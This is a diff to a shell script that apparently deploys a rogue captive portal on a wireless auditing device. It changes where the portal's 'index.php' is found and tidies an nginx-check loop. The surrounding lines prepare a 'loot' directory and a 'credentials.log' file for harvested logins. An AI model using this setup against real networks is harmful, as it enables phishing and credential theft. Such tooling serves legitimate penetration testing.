@@ -85,14 +85,18 @@ mkdir -p "$PORTAL_ROOT"
 mkdir -p "$LOOT_DIR"
 chmod 777 "$LOOT_DIR"
 
-if [ -f "$PAYLOAD_DIR/../../portal/index.php" ]; then
-    cp "$PAYLOAD_DIR/../../portal/index.php" "$PORTAL_ROOT/index.php"
-    chmod 644 "$PORTAL_ROOT/index.php"
-    LOG green "  Deployed index.php to $PORTAL_ROOT/"
+# Look in payload dir first (on-device), then repo-relative path (development)
+if [ -f "$PAYLOAD_DIR/index.php" ]; then
+    PORTAL_SRC="$PAYLOAD_DIR/index.php"
+elif [ -f "$PAYLOAD_DIR/../../portal/index.php" ]; then
+    PORTAL_SRC="$PAYLOAD_DIR/../../portal/index.php"
 else
-    ERROR_DIALOG "index.php not found at $PAYLOAD_DIR/../../portal/index.php"
+    ERROR_DIALOG "index.php not found — copy portal/index.php to $PAYLOAD_DIR/"
     exit 1
 fi
+cp "$PORTAL_SRC" "$PORTAL_ROOT/index.php"
+chmod 644 "$PORTAL_ROOT/index.php"
+LOG green "  Deployed index.php to $PORTAL_ROOT/"
 
 # Initialize credentials log
 touch "$LOOT_DIR/credentials.log"
@@ -188,7 +192,7 @@ sleep 1
 
 if ! nginx -t 2>&1 | grep -q "test is successful"; then
     LOG red "[ERROR] nginx configuration test failed!"
-    nginx -t 2>&1 | while read line; do LOG "  $line"; done
+    nginx -t 2>&1 | while read -r line; do LOG "  $line"; done
     ERROR_DIALOG "nginx config invalid! Check logs."
     exit 1
 fi
